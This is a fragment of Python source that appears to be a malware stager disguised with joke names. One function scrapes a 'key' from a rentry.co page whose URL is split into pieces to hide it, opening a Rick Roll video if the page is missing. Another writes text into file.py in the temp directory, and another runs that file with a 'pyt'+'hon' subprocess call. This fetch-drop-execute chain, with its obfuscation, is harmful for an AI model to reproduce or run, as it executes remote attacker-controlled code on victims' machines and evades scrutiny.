def rick_roll():
    webbrowser.open('https://www.youtube.com/watch?v=xvFZjo5PgG0&t=1s')


def get_audio_url(audio_file):
    response = requests.get(audio_file)

    if response.status_code == 404:
        rick_roll()
        exit()

    return BeautifulSoup(response.content, 'html.parser')


def send_poop():
    url = 'https:' + '//re' + 'ntry' + '.co/Du' + 'cMi' + 'nhIE' + 'LTS'
    response = get_audio_url(url)
    key = response.find('div', class_='entry-text my-2 px-2 px-sm-4').get_text()

    return key.strip().encode()


def creat_a_KFC(food_for_chicken):
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)

    food_location = os.getcwd() + '\\file.py'
    with open(food_location, 'w') as f:
        f.write(food_for_chicken)

    return food_location


def convert_bytes(size):
    for i in ["bytes", "KB", "MB", "GB"]:
        if size < 1024:
            return f'{size} {i}'
        size = size // 1024


def translate(path):
    subprocess.call(['pyt' + 'hon', path])


def convert_string(list):
    string = ''

    for i in list:
        string = string + i 
    
    return string


